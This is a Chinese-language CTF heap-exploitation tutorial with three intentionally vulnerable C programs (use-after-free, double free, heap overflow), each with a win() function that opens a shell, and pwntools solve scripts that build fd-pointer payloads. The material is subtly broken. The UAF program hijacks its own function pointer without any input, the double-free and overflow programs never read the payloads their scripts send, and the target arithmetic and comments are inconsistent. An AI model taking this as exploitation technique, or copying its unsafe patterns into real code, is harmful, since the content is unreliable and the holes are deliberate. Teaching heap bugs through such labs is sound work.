CTF-Pwn 堆漏洞实战

学习堆内存漏洞：UAF、Double Free、Heap Overflow等。

堆漏洞基础概念

malloc / free

glibc堆分配器管理内存，free后chunk被放入bins

UAF (Use After Free)

释放后继续使用，chunk内容可能被重新分配

Double Free

同一切块free两次，导致链表破坏

1

challenge1 - Use After Free

入门

源码 (heap1.c)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct chunk {
    void (*print)(void);  // 函数指针
    char name[32];
};

struct chunk *c1, *c2;

void win() {
    system("/bin/sh");
}

void print_name() {
    printf("Name: %s\n", c2->name);
}

int main() {
    printf("Heap Challenge 1 - UAF\n");
    
    // 分配两个chunk
    c1 = malloc(sizeof(struct chunk));
    c2 = malloc(sizeof(struct chunk));
    
    strcpy(c1->name, "Chunk 1");
    strcpy(c2->name, "Chunk 2");
    c1->print = print_name;
    
    printf("c1 @ %p, c2 @ %p\n", c1, c2);
    
    // 释放c1
    free(c1);
    
    // 释放c2后，c1可能被重新分配
    free(c2);
    
    // 此时c1指向的内存已经被重新使用
    // 但我们还保存着c1的指针，这就是UAF
    
    // 重新分配，填充c1的内容
    c1 = malloc(sizeof(struct chunk));  // 可能拿到原来的chunk
    strcpy(c1->name, "Hacked!");
    c1->print = win;  // 修改函数指针为win
    
    // 调用print，实际会执行win
    c1->print();  // UAF!
    
    return 0;
}
漏洞分析
  • 漏洞点：释放后仍保留指针引用 (UAF)
  • 利用方法：重新分配后覆盖函数指针
  • 关键：c1->print = win 覆盖为我们的函数
  • 结果：调用 c1->print() 即执行 win()

编译命令

gcc -no-pie -fno-stack-protector -o heap1 heap1.c
注意：堆题通常不需要-z execstack

Python 解题脚本

#!/usr/bin/env python3
from pwn import *

p = process('./heap1')
elf = ELF('./heap1')

# 接收输出获取chunk地址
p.recvuntil("c1 @ ")
c1_addr = int(p.recvuntil(",").strip().decode(), 16)
p.recvuntil("c2 @ ")
c2_addr = int(p.recvline().strip().decode(), 16)
print(f"c1: {hex(c1_addr)}, c2: {hex(c2_addr)}")

# 接收直到结束
p.interactive()

# 注：这道题主要理解UAF概念
# malloc返回被free的chunk时，我们可以控制其内容
# 当再次调用c1->print()时，执行的是我们覆盖后的函数指针
UAF 利用关键
  • free() 后 chunk 被放回 bins，但指针仍有效
  • 下次 malloc() 可能返回同一个 chunk
  • 如果程序继续使用旧指针读写，就能控制 chunk 内容
  • 修改函数指针 → 控制流劫持

challenge2 - Double Free

进阶

源码 (heap2.c)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *chunk_ptrs[3];

void *target_addr;

void win() {
    system("/bin/sh");
}

int main() {
    printf("Heap Challenge 2 - Double Free\n");
    printf("win @ %p\n", win);
    
    // 分配3个chunk
    chunk_ptrs[0] = malloc(0x40);
    chunk_ptrs[1] = malloc(0x40);
    chunk_ptrs[2] = malloc(0x40);
    
    printf("chunks: %p, %p, %p\n", 
           chunk_ptrs[0], chunk_ptrs[1], chunk_ptrs[2]);
    
    // 释放第一个
    free(chunk_ptrs[0]);
    
    // 释放第二个
    free(chunk_ptrs[1]);
    
    // 再释放第一个 - double free!
    free(chunk_ptrs[0]);
    
    // 此时fastbin链表被破坏
    // 下次malloc可能分配到任意地址
    
    return 0;
}
漏洞分析
  • 漏洞点：free(chunk_ptrs[0]) 被调用两次
  • 利用方法：修改chunk的fd指针指向目标地址
  • Fastbin特性：LIFO，后进先出，只检查size
  • 目标：分配到 win 函数附近

编译命令

gcc -no-pie -fno-stack-protector -o heap2 heap2.c

Python 解题脚本

#!/usr/bin/env python3
from pwn import *

p = process('./heap2')
elf = ELF('./heap2')

# 泄露win地址
p.recvuntil("win @ ")
win_addr = int(p.recvuntil("\n").strip().decode(), 16)
print(f"win: {hex(win_addr)}")

# 接收chunk地址
p.recvuntil("chunks: ")
chunks = []
for _ in range(3):
    addr = int(p.recvuntil(", " if _ < 2 else "\n").strip().decode(), 16)
    chunks.append(addr)
print(f"chunk0: {hex(chunks[0])}")
print(f"chunk1: {hex(chunks[1])}")
print(f"chunk2: {hex(chunks[2])}")

# Double Free利用
# 1. free(chunk0)
# 2. free(chunk1)  
# 3. free(chunk0) - 再次free，形成循环

# 4. malloc(0x40) 返回chunk0
# 5. 我们写入fd指针指向 win - 0x10 附近
# 6. malloc(0x40) 返回chunk1
# 7. malloc(0x40) 返回我们构造的地址

# 计算目标地址 (malloc_hook附近，需要构造合理size)
target = win_addr - 0x30  # 通常malloc_hook附近需要合理size
print(f"Target: {hex(target)}")

# 构造payload: fd指针
payload = p64(target)  # 修改chunk0的fd为target

# 发送payload（需要输入被read读取）
p.sendline(payload)

p.interactive()
Double Free 原理
  • Fastbin使用单向链表：chunk → next_chunk → NULL
  • 每个chunk的fd指针指向下一个free的chunk
  • Double free会导致链表：chunk0 → chunk1 → chunk0
  • 修改fd可让malloc返回任意地址
  • 关键：目标地址处的chunk size必须匹配fastbin索引

challenge3 - Heap Overflow

高阶

源码 (heap3.c)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct {
    char buf[64];
    void *ptr;
} data;

void win() {
    system("/bin/sh");
}

int main() {
    char *p1, *p2;
    
    printf("Heap Challenge 3 - Heap Overflow\n");
    printf("win @ %p\n", win);
    
    p1 = malloc(0x40);
    p2 = malloc(0x40);
    
    printf("p1 @ %p, p2 @ %p\n", p1, p2);
    
    strcpy(p1, "AAAA");  // 填满p1
    
    // 危险！使用strcpy不限制长度
    strcpy(p1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"); 
    // 溢出到p2的chunk header，可以修改p2的内容
    
    printf("p2 now points to: %p\n", p2);
    
    // 如果我们能让p2指向win，就能getshell
    // 但实际上溢出会覆盖p2的内容...
    
    free(p1);
    free(p2);
    
    return 0;
}
漏洞分析
  • 漏洞点：strcpy(p1, long_string) 溢出到相邻chunk
  • 利用方法：覆盖下一个chunk的元数据
  • 关键结构：chunk header包含 prev_size 和 size
  • 技巧：修改 size 可以骗过malloc的检查

编译命令

gcc -no-pie -fno-stack-protector -o heap3 heap3.c

Python 解题脚本

#!/usr/bin/env python3
from pwn import *

p = process('./heap3')
elf = ELF('./heap3')

# 泄露win地址
p.recvuntil("win @ ")
win_addr = int(p.recvuntil("\n").strip().decode(), 16)

# 接收chunk地址
p.recvuntil("p1 @ ")
p1_addr = int(p.recvuntil(",").strip().decode(), 16)
p.recvuntil("p2 @ ")
p2_addr = int(p.recvuntil("\n").strip().decode(), 16)
print(f"p1: {hex(p1_addr)}, p2: {hex(p2_addr)}")

# Heap Overflow利用
# p1 64字节后是p2的chunk header
# chunk结构: [prev_size(8)][size(8)][fd(8)][bk(8)][data...]
# 溢出修改p2的fd/bk指针

# 构造payload
# 64字节填充 + p2的chunk header (16字节) + fd指针
payload = b'A' * 64
payload += p64(0)        # prev_size
payload += p64(0x51)     # size (0x50 + PREV_INUSE)
payload += p64(win_addr) # fd -> 指向win!
payload += p64(0)        # bk

print(f"Payload: {len(payload)} bytes")
p.sendline(payload)

p.interactive()
堆溢出 vs 栈溢出
  • 栈溢出：覆盖返回地址 → 控制RIP
  • 堆溢出：覆盖chunk元数据 → 控制malloc返回地址
  • 覆盖fd/bk：下次malloc可能分配到任意地址
  • 这是一种"write-what-where" primitive
